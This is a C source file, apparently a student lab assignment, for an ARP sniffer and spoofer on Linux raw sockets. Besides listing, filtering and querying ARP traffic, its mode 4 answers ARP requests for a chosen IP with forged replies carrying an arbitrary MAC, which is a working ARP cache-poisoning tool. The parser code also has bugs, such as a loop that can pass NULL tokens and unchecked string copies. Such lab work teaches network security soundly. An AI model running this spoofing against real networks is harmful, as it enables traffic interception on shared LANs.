#include <netinet/if_ether.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netpacket/packet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include "arp.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <math.h>
#include <netinet/in.h>
#include <arpa/inet.h> 
#include <string.h>
#include <unistd.h>
/* 
 * Change "enp2s0f5" to your device name (e.g. "eth0"), when you test your hoework.
 * If you don't know your device name, you can use "ifconfig" command on Linux.
 * You have to use "enp2s0f5" when you ready to upload your homework.
 */
#define DEVICE_NAME "eth0"

void print_ip(uint8_t[]);
void print_arp(uint8_t [], uint8_t []);
int filter(char *, uint8_t *);
void print_usage(){
	printf("Format :\n");
	printf("1) ./arp -l -a\n");
	printf("2) ./arp -l <filter_ip_address>\n");
	printf("3) ./arp -q <query_ip_address>\n");
	printf("4) ./arp <fake_mac_address><target_ip_address>\n");
}
/*
 * You have to open two socket to handle this program.
 * One for input , the other for output.
 */
int main(int argc, char *argv[])
{
	int sockfd_recv = 0, sockfd_send = 0, mode=0;
	struct sockaddr_ll sa;
	struct ifreq req;
	struct in_addr myip;
	char buffer[2048];
	struct arp_packet arp_pack_recv, arp_pack_send;
	char *ip, MAC[64];

	if(getuid()!=0){
		printf("ERROR: You must be root to use this tool!\n");
		exit(-1);
	}else if(argc < 2  || strcmp(argv[1], "-help")==0){
		print_usage();
		exit(0);
	}else if(strcmp(argv[1], "-l")==0){
		if(argc==2){
			printf("use -help to read the usage\n");
			exit(-1);
		}else if(strcmp(argv[2], "-a")==0){
			mode=1;
		}else{
			mode=2;
		}
	}else if(strcmp(argv[1], "-q")==0){
		mode=3;
	}else{
		if(argc==3)
			mode=4;
		else
			print_usage();
	}
	printf("[ ARP sniffer and spoof program ]\n");
	if(mode==1)
		puts("### ARP sniffer mode");
	else if(mode==2){
		ip=argv[2];
	}else if(mode==3){
		puts("### ARP query mode");
		ip=argv[2];
	}else if(mode==4){
		ip=argv[1];
		// MAC=argv[2];
		strcpy(MAC, argv[2]);
	}

	// Open a recv socket in data-link layer.
	if((sockfd_recv = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
	{
		perror("open recv socket error");
		exit(1);
	}

	/*
	 * Use recvfrom function to get packet.
	 * recvfrom( ... )
	 */
	if(mode==1 || mode==2 || mode==4){
		socklen_t len = sizeof(struct sockaddr_ll);
		while(1){
			ssize_t bytes=recvfrom(sockfd_recv, &arp_pack_recv, sizeof(struct arp_packet), 0, (struct sockaddr *)&sa, &len);
			if(sa.sll_protocol == htons(ETH_P_ARP)){
				if(mode==1){
					print_arp(arp_pack_recv.arp.arp_tpa, arp_pack_recv.arp.arp_spa);
				}else if(mode==2 || mode == 4){
					int check = filter(ip, arp_pack_recv.arp.arp_tpa);
					if(check && mode==2){
						print_arp(arp_pack_recv.arp.arp_tpa, arp_pack_recv.arp.arp_spa);
					}else if(check && mode==4){
						break;
					}
				}
			}
		}
	}


	// Open a send socket in data-link layer.
	if((sockfd_send = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
	{
		perror("open send socket error");
		exit(sockfd_send);
	}
	
	/*
	 * Use ioctl function binds the send socket and the Network Interface Card.
`	 * ioctl( ... )
	 */
	strcpy(req.ifr_ifrn.ifrn_name, DEVICE_NAME);	//set Device name
	if(mode==3){
		if(ioctl(sockfd_send,SIOCGIFADDR,&req) == -1){
			perror("ioctl error!");
			exit(-1);
		}
		struct sockaddr_in *addr = (struct sockaddr_in *)&(req.ifr_addr);
		char *address = inet_ntoa(addr->sin_addr);
		memcpy(arp_pack_send.arp.arp_spa , &(addr->sin_addr.s_addr), 4);	//source ip
	}else if(mode==4){
		in_addr_t addr = inet_addr(ip);
		memcpy(arp_pack_send.arp.arp_spa, &(addr), 4);
	}

	u_int8_t hd[6];  //store MAC
	if(mode==3){
		if( ioctl(sockfd_send, SIOCGIFHWADDR, &req) == -1)
			printf("ioctl error.\n"), exit(0);
	
		memcpy( hd, req.ifr_hwaddr.sa_data, sizeof(hd));
    	memcpy(arp_pack_send.arp.arp_sha , req.ifr_hwaddr.sa_data, 6);	//source mac
		// printf("HWaddr: %02X:%02X:%02X:%02X:%02X:%02X\n", hd[0], hd[1], hd[2], hd[3], hd[4], hd[5]);
	}else if(mode==4){
		char *tok;
		int i=0;
		char mac_tmp[64];
		strcpy(mac_tmp,MAC);
		tok = strtok(mac_tmp, ":");
		while(tok!=NULL || i<5){
			hd[i]=strtol(tok,NULL, 16);
			i++;
			tok = strtok(NULL, ":");
		}
    	memcpy(arp_pack_send.arp.arp_sha , hd, sizeof(hd));	//source mac
	}
    if( ioctl(sockfd_send, SIOCGIFINDEX, &req) == -1)
        printf("ioctl error.\n"), exit(0);
	if(mode==3){
		for(int i=0;i<ETH_ALEN;i++)
			arp_pack_send.eth_hdr.ether_dhost[i]=0xff;
	}else if(mode==4){
		memcpy(arp_pack_send.eth_hdr.ether_dhost, arp_pack_recv.eth_hdr.ether_shost,6 ); //recv packet's source MAC is send packet's dst MAC
	}
	memcpy(arp_pack_send.eth_hdr.ether_shost, hd, ETH_ALEN);	
	arp_pack_send.eth_hdr.ether_type = htons(ETH_P_ARP);

	arp_pack_send.arp.ea_hdr.ar_hrd= htons(ARPHRD_ETHER);	//0x0001
	arp_pack_send.arp.ea_hdr.ar_pro= htons(ETHERTYPE_IP);	//0x0800
	arp_pack_send.arp.ea_hdr.ar_hln= ARPHRD_IEEE802;		//6
	arp_pack_send.arp.ea_hdr.ar_pln= ARPHRD_PRONET;		//4

	if(mode==3)
		arp_pack_send.arp.ea_hdr.ar_op= htons(0x0001);	//arp request
	else if(mode==4)
		arp_pack_send.arp.ea_hdr.ar_op= htons(0x0002);	//arp reply

	if(mode==3){
		struct in_addr target_ip;
		inet_aton(ip, &target_ip);
		memcpy(arp_pack_send.arp.arp_tpa, &(target_ip.s_addr), 4);
	}else if(mode==4){
		memcpy(arp_pack_send.arp.arp_tpa, &arp_pack_recv.arp.arp_spa, 4);
	}




	// Fill the parameters of the sa.
	bzero(&sa, sizeof(sa));
	sa.sll_family = PF_PACKET;
	sa.sll_ifindex = req.ifr_ifru.ifru_ivalue;

	
	/*
	 * use sendto function with sa variable to send your packet out
	 * sendto( ... )
	 */
	
	if(sendto(sockfd_send, &arp_pack_send, sizeof(arp_pack_send), 0,(struct sockaddr *)&sa, sizeof(sa)) == -1){
		perror("send packet error");
		exit(-1);
	}else{
		if(mode==4)
			printf("\nSent ARP Reply : %s is %s\n",ip,MAC);
		printf("Send successful!\n");
	}
	

	return 0;
}

void print_ip(uint8_t ip[]){

	for(int i=0;i<4;i++){
		printf("%d", (int)ip[i]);
		if(i!=3)
			printf(".");
	}
}

void print_arp(uint8_t who_has_ip[], uint8_t tell_ip[]){
	printf("Get ARP packet - who has ");
	print_ip(who_has_ip);
	printf("\tTell ");
	print_ip(tell_ip);
	puts("");
}

int filter(char *filter_ip, uint8_t pack_ip[]){
	char delim[2] = ".";
	char ip_tmp[100];
	strcpy(ip_tmp, filter_ip);
	char *ftok=strtok(ip_tmp, delim);
	for(int i=0;i<4;i++){
		if(atoi(ftok) != (int)pack_ip[i]){
			return 0;
		}
		ftok=strtok(NULL, delim);
	}
	return 1;
}
